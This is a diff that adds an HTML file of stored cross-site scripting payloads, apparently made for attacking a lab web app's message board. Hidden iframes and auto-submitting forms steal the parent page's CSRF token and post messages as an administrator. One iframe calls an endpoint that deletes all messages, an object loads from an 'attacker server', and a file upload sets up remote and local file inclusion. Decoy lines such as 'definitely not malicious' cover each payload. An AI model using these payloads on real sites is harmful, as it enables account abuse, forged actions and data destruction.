@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+
+<!-- The desired (goal) form -->
+<form id="contact-form" name="contact-form" action="/request" method="POST">
+	<script>
+		document.getElementsByName('contact-form')[0].style.opacity = 0;
+	</script>
+	<input type="text" id="name" name="name" value="Attacker">
+	<input type="email" id="email" name="email" value="attacker@xss.com">
+	<input type="text" id="subject" name="subject" value="Fake Admin Message">
+	<input type="tel" id="phone_number" name="phone_number" value="0509110911">
+	<textarea type="text" id="message" name="message" rows="2" class="form-control md-textarea" style="height: 150px;">
+		Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse sodales pellentesque neque, gravida semper turpis hendrerit in. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vestibulum sit amet leo eu justo fermentum malesuada. Mauris condimentum metus mi, ut bibendum orci pellentesque et. Cras fermentum purus eu enim rutrum gravida. Vivamus varius maximus enim. Ut dapibus at dolor ac pretium. Curabitur vel justo nisl. Duis ac iaculis metus. Curabitur a facilisis neque. Vestibulum bibendum dignissim quam, vel dictum ipsum gravida eget. Phasellus quis maximus purus. Nam semper aliquam velit. Duis quis nisi at turpis viverra dignissim.
+	</textarea>
+	<input type="hidden" value="" name="csrf_token">
+	<script>
+		var x = window.parent.document.getElementsByName('csrf_token')[0].value;
+		document.getElementsByName('csrf_token')[0].value = x;
+	</script>
+</form>
+<script>document.getElementById('contact-form').submit();</script>
+
+
+<!-- Publish message as an administrator -->
+<iframe style="display: none;" src="javascript:
+const d = window.parent.document;
+var tags = d.getElementsByTagName('p');
+var isAdmin = true;
+for (const t of tags) {
+	if (t.innerHTML === 'אתה מחובר כמשתמש חלש!') {
+		isAdmin = false;
+	}
+}
+if (isAdmin) {
+	var headers3 = d.getElementsByTagName('h3');
+	var wasPublished = false;
+	for (const h3 of headers3) {
+		if (h3.innerHTML === 'Mail: attacker@xss.com') {
+			wasPublished = 1;
+		}
+	}
+	if (!wasPublished) {
+		d.getElementsByName('name')[0].value = 'Attacker';
+		d.getElementsByName('email')[0].value = 'attacker@xss.com';
+		d.getElementsByName('subject')[0].value = 'Attacking';
+		d.getElementsByName('phone_number')[0].value = '052911911';
+		d.getElementsByName('message')[0].value = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse sodales pellentesque neque, gravida semper turpis hendrerit in. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vestibulum sit amet leo eu justo fermentum malesuada. Mauris condimentum metus mi, ut bibendum orci pellentesque et. Cras fermentum purus eu enim rutrum gravida. Vivamus varius maximus enim. Ut dapibus at dolor ac pretium. Curabitur vel justo nisl. Duis ac iaculis metus. Curabitur a facilisis neque. Vestibulum bibendum dignissim quam, vel dictum ipsum gravida eget. Phasellus quis maximus purus. Nam semper aliquam velit. Duis quis nisi at turpis viverra dignissim.';
+		d.getElementsByName('contact-form')[0].submit();
+	}
+}"></iframe>
+Just an ordinary legitimate message :)
+
+
+<!-- Drop all messages -->
+<iframe style="display: none;" src="https://172.21.64.72:5000/drop_all_messages"></iframe>
+This message is definitely not malicious :)
+
+
+<!-- Use object to create an image as a pre-step for JavaScript usage -->
+<object width="600" height="400" data="https://upload.wikimedia.org/wikipedia/commons/1/1e/F-22_Raptor_edit1_%28cropped%29.jpg"></object>
+
+
+<!-- Load object from a malicious source - an attacker server -->
+<object width="0" height="0" style="opacity: 0;" data="http://127.0.0.1:8080/"></object>
+Another legitimate message :D
+
+
+<!-- RFI and LFI exploitation -->
+<iframe style="display: none;" src="javascript:
+var tags = window.parent.document.getElementsByTagName('p');
+var isAdmin = true;
+for (const t of tags) {
+	if (t.innerHTML === 'אתה מחובר כמשתמש חלש!') {
+		isAdmin = false;
+	}
+}
+if (isAdmin) {
+	var blob = new Blob(['<script>alert(911)</script>'],{type:'text/plain;charset=utf-8'});
+	var formData = new FormData();
+	formData.append('file', blob, 'rfi.html');
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'https://172.21.64.72:5000/upload', true);
+	xhr.send(formData);
+}"></iframe>
+<iframe style="display: none;" src="https://172.21.64.72:5000/local/rfi.html"></iframe>
+Anyone said files?
+
